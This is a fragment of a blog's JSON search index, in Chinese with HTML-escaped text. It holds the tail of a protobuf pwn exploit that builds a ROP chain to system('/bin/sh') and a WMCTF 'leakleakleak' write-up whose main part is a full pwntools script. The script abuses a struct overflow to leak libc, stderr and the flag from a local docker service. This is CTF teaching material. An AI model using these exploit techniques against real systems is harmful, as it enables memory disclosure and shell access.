libc_addr ret = 0x000000000002a3e6 + libc_addr debug() clean((b\u0026#34;a\u0026#34;*0x28+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)).ljust(0x58,b\u0026#34;\\x00\u0026#34;)) p.interactive() if __name__ == \u0026#34;__main__\u0026#34;: pwn() 参考 ACT TEAM\n","permalink":"https://www.y4ng.cn/posts/pwn/protobuf/","summary":"感觉不如JSON🤷‍♂️","title":"Protobuf pwn"},{"content":" 题目分析 竟然给了源码0.0，直接开看！！！\nflag以全局变量存在bss段中\nchecksec一下果然开了PIE\u0026hellip;\u0026hellip;.\n继续看源码，建立了一个结构体，并将成员分别输出\n结构体如下\n1 2 3 4 typedef struct { char username[32]; char *description; } User; 漏洞点在于第一个read语句，对username的读入会覆盖掉description，可以打开pwndbg看结构体在内存上的分布\nusername占0x20，却可以读入0x28个字节，将0x55555555c5f0（description）给覆盖，之后在将description给输出时，有一个任意内存泄露\n想到这，我们就可以通过泄露的方式将flag给读出\n漏洞利用 由于开了PIE，低三位是不变的，先看看flag的地址\n第三位是0X0C0，由于没有内存直接指向flag，先看看周围的内存空间，发现flag上面有std_err\n一般libc中都会有内存指向std_err，所以在libc中搜索一下，果然发现了\n由于libc中偏移是固定的，所以现在只需要泄露个libc地址就ok了，在堆附近可以看到有一个unsorted bin，泄露出它的fd就行了\n总结，我们的leak路线就是unsorted_bin.fd\u0026mdash;\u0026ndash;\u0026gt; stderr\u0026mdash;\u0026mdash;\u0026ndash;\u0026gt;flag\n泄露FD上的libc是1/16的几率爆破\n由于远程偏移不一样，我们开一个docker容器将里面的libc和ld给拿出来\n1 sudo docker run -p 5000:5000 --privileged $(sudo docker build -q .) 之后就是让人崩溃的偏移调试。。。。最终偏移是通过泄露出了附近的地址手动确定的\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from pwn import * context(os = \u0026#39;linux\u0026#39;,arch = \u0026#39;amd64\u0026#39;,log_level = \u0026#39;debug\u0026#39;,timeout=0.5) binary_path = \u0026#39;./leakleakleak\u0026#39; libc_path = \u0026#39;./libc.so.6\u0026#39; elf = ELF(binary_path) #leak_addr = lambda name,addr: log.success(f\u0026#39;{name}-----\u0026gt;\u0026#39;+hex(addr)) #main_arena_offset = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 def debug(): gdb.attach(p) pause() #\u0026#34;0x7fe8c7a74848\u0026#34; while(True): try: p = remote(\u0026#34;127.0.0.1\u0026#34;, 5000) p.recvuntil(b\u0026#39;What is your name? \u0026#39;) payload = b\u0026#39;a\u0026#39;*32+b\u0026#39;\\x10\\xa7\u0026#39; #debug() p.send(payload) p.recvuntil(b\u0026#39;Let me tell you something about yourself! :3\\n\u0026#39;) addr = u64(p.recvuntil(b\u0026#39;\\x7f\u0026#39;).ljust(8,b\u0026#39;\\x00\u0026#39;)) log.success(\u0026#34;libc---\u0026gt;\u0026#34; + hex(addr)) std_err = addr - 0xe38 p.recvuntil(b\u0026#39;Continue? (Y/n) \u0026#39;) p.sendline(b\u0026#39;Y\u0026#39;) #second p.recvuntil(b\u0026#39;What is your name? \u0026#39;) payload = b\u0026#39;a\u0026#39;*32+p64(std_err) p.send(payload) p.recvuntil(b\u0026#39;Let me tell you something about yourself! :3\\n\u0026#39;) flag_addr = u64(p.recvuntil(b\u0026#39;\\n\u0026#39;,drop=True).ljust(8,b\u0026#39;\\x00\u0026#39;)) + 0x20 log.success(\u0026#34;flag_addr---\u0026gt;\u0026#34;+hex(flag_addr)) p.recvuntil(b\u0026#39;Continue? (Y/n) \u0026#39;) p.sendline(b\u0026#39;Y\u0026#39;) #third log.success(\u0026#34;libc---\u0026gt;\u0026#34; + hex(addr)) log.success(\u0026#34;stderr--\u0026gt;\u0026#34; + hex(std_err)) log.success(\u0026#34;flag_addr---\u0026gt;\u0026#34;+hex(flag_addr)) p.recvuntil(b\u0026#39;What is your name? \u0026#39;) p.send(payload) payload = b\u0026#39;a\u0026#39;*32+p64(flag_addr) p.send(payload) p.interactive() except: p.close() ","permalink":"https://www.y4ng.cn/posts/writeups/wmctf/","summary":"题目分析 竟然给了源码0.0，直接开看！！！\nflag以全局变量存在bss段中\nchecksec一下果然开了PIE\u0026hellip;\u0026hellip;.\n继续看源码，建立了一个结构体，并将成员分别输出\n结构体如下\n1 2 3 4 typedef struct { char username[32]; char *description; } User; 漏洞点在于第一个read语句，对username的读入会覆盖掉description，可以打开pwndbg看结构体在内存上的分布\nusername占0x20，却可以读入0x28个字节，将0x55555555c5f0（description）给覆盖，之后在将description给输出时，有一个任意内存泄露\n想到这，我们就可以通过泄露的方式将flag给读出\n漏洞利用 由于开了PIE，低三位是不变的，先看看flag的地址\n第三位是0X0C0，由于没有内存直接指向flag，先看看周围的内存空间，发现flag上面有std_err\n一般libc中都会有内存指向std_err，所以在libc中搜索一下，果然发现了\n由于libc中偏移是固定的，所以现在只需要泄露个libc地址就ok了，在堆附近可以看到有一个unsorted bin，泄露出它的fd就行了\n总结，我们的leak路线就是unsorted_bin.fd\u0026mdash;\u0026ndash;\u0026gt; stderr\u0026mdash;\u0026mdash;\u0026ndash;\u0026gt;flag\n泄露FD上的libc是1/16的几率爆破\n由于远程偏移不一样，我们开一个docker容器将里面的libc和ld给拿出来\n1 sudo docker run -p 5000:5000 --privileged $(sudo docker build -q .) 之后就是让人崩溃的偏移调试。。。。最终偏移是通过泄露出了附近的地址手动确定的\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from pwn import * context(os = \u0026#39;linux\u0026#39;,arch = \u0026#39;amd64\u0026#39;,log_level = \u0026#39;debug\u0026#39;,timeout=0.","title":"W\u0026MCTF pwn writeups"}]